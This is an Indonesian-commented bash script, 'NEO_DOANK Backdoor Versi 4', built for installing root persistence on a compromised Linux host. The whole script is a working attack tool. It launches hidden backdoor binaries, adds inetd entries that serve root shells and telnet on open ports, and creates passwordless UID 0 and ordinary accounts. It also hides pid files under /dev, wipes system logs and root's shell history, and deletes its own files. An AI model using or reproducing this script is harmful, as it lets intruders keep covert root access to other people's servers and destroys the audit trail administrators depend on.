#!/bin/bash
#NEO_DOANK Backdoor Versi 4
#Saya Menggunakan beberapa backdoor Untuk reconnect ke Dalam Box online saya
#bagi yang tidak tahu mengenai bahasa pemerograman
#Saya harap Anda tidak Melakukan Editing terhadap script ini 
#karena saya tidak tanggung Jawab jika tool's ini tidak bekerja semestinya
#saya telah memperbaiki segala kekurangan dari tools ini
#setelah melaukuan instalasi selanjutnya anda harus menghapus log anda karena 
#log itu adalah Sebagai jejak anda

ips=`hostname -i`
basedir=`pwd`
unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin


if [ "$(whoami)" != "root" ]; then
   echo "${DCYN}[${WHI}sh${DCYN}] ${WHI} BECOME ROOT AND TRY AGAIN ${RES}"
   echo ""
   exit
fi
echo "==================================================="
echo "     This backdoor internal Use                    "
echo "                                                   "
echo "      This tool's for My study                     "
echo "==================================================="

if ! test -s vf.tgz 
then 
echo "vf.tgz Not Found"
echo ""
fi
tar -zxvf vf.tgz

/etc/init.d/inetd start
/etc/init.d/ssh start
cd .bash
#Buka Script
echo "Host namenya";hostname -f
#kita buat Dolo yak Permission dari semua tools
chmod 755 dor
./dor
chmod 755 neo1
#backdoor pertama udah bisa di jalankan
chmod 755 neo2
#backdoor kedua udah bisa di jalankan
chmod 755 md5
chmod 755 she
chmod 755 hell
#Sekarang kita jalankan backdoornya
./xh -s "/bin/sh" -d -p neo1.pid ./neo1 a  -u 0:0
./xh -s "/bin/sh" -d -p hell.pid ./bash 
./xh -s "/bin/sh" -d -p hell2.pid ./she a  -u 0:0
./.,
./xh -s "/bin/sh" -d -p neo2.pid ./neo2 a  -u 0:0
./xh -s "/usr/sbin/httpd" -d -p hell.pid ./bash 

echo "========================================================================"
echo "        Backdoor Pertama  telah Di jalankan  have Fun                   "
echo "========================================================================"

#now Sekarang Kita hapus jejak Kita Donk 
#Jgn takut Log endak ada lagi xixixi Semua Log Kita dah Endak Di butuhkan Lagi neh

echo "" >/var/log/*
touch /var/log/*
chmod 744 /var/log/*
echo "" /root/.bash_history
echo "service  8893/udp" >> /etc/services
echo "dial  stream  udp nowait  root    /usr/sbin/tcpd     -addr $ips -port 8893" >>  /etc/inetd.conf 
killall -HUP inetd
echo "==============================================================================="
echo "kita Hilangkan fungsi log file-nya  Agar kita bisa lama-lama di Box kita xixixi"
echo "==============================================================================="

#asikkk buat Lagi backdoor Kedua xixixixi

mv hell.pid  /dev/tty1O
mv hell2.pid /dev/ttys
mv neo2.pid  /dev/.c
mv neo3.pid  /dev/.d
echo "========================================================================"
echo "                 Wew backdoor Ke Dua Udah jalan Neh                     " 
echo "========================================================================"

#eh bagi-bagi User Donk xixixi  Hm Yang Ini Buat Saya yak 
useradd  nobodye
passwd -d nobodye
echo "==========================================="
#neh kamu add user root ajah xixixi 

useradd -u  0 -o  -g 0 -s /bin/bash   syss
passwd -d syss
echo "========================================================================"
echo "                 OK deh Loginnya syss                                   " 
echo "                 kalo passwdnya seh  syss Juga                         " 
echo "========================================================================"

#duh kurang Neh backdoornya Kita Pake MD5 backdoor  

echo "====================================================================="
echo "Udah jadi Neh Backdoor Ke Tiga KOmPlite Deh backdoor Kita EnaKs Donks"
echo "====================================================================="


#Nah Kita Buat telnet backdoor Dari telnet deh 
#kalo backdoor yang ketiga tadi Masih bisa di Lumpuhkan
#Nah Saya ada 2 jalan keluar, Nah ini berguna untuk user yang di add tadi buat Login  



echo "support  9641/udp" >> /etc/services
echo "dial stream tcp nowait root /bin/sh sh -i" >> /etc/inetd.conf
killall -HUP inetd
killall -HUP /usr/sbin/inetd

echo "========================================================================"
echo "    Horeeee Udah jadi backdoor ke 4, ini hanya untuk jaga-jaga saja     "
echo "    This Port For root Login                                            " 
echo "    You can telnet to  Port 9641                                        "
echo "========================================================================"


echo "root 76000/tcp" >> /etc/services
echo "root stream tcp nowait root /bin/sh sh -i" >> /etc/inetd.conf
echo "16030 stream tcp nowait root /usr/sbin/tcpd in.telnetd" >>  /etc/inetd.conf
killall -HUP inetd
killall -HUP /usr/sbin/inetd

echo "========================================================================"
echo "  Horeeee Udah jadi backdoor ke 5, ini hanya untuk jaga-jaga saja       "
echo "  Hehehehe Backdoor ini Buat Login USer yang baru di add Tadi           "
echo "========================================================================"



#Kita hapus semua tool Kita agar endak ketahuan xixiix

cd ..
cd $basedir
rm vf.tgz
rm -rf .bash
rm neo.sh
cd ..
rm d00r.tgz 
cd $basedir
cd .d00r
rm neo.sh
rm -rf .bash
 
#This Copy RiGht By Me

echo "========================================================================"
echo "         The Backdoor Finished Now What you do Now                      "
echo "         This Backdoor modifed By NEO_DOANK                             "
echo "         Mail Me kollop_crk@yahoo.com                                   "
echo "========================================================================"
clear 
sleep 2
rm  /var/adm/*
rm /var/log/*
touch /var/log/*
chmod 744 /var/log/*
chmod 744 /usr/local/psionic/portsentry/*
rm   /var/log/smail/logfile
echo "" > /var/log/smail/logfile
rm /var/log/sendfile/*
rm /root/.bash_history
echo "" >  /root/.bash_history
touch /root/.bash_history
rm /var/log/*
touch /var/log/*
#Tutup Script
echo "========================================================================"
echo "Yup kita lihat Lebih rinci info Box Kita ini hehehehe :-D"
uname -a

echo "========================================================================"
echo "        Re- Hapus Log Anda /   Re- Del Your Log                         "
echo "        Thanks for Using NEO_DOANK Root Backdoor                        "
echo "  								      "
echo "        Untuk Port And Password Baca Readme [ cat readme ]              "
echo "                                                                        " 
echo "========================================================================"





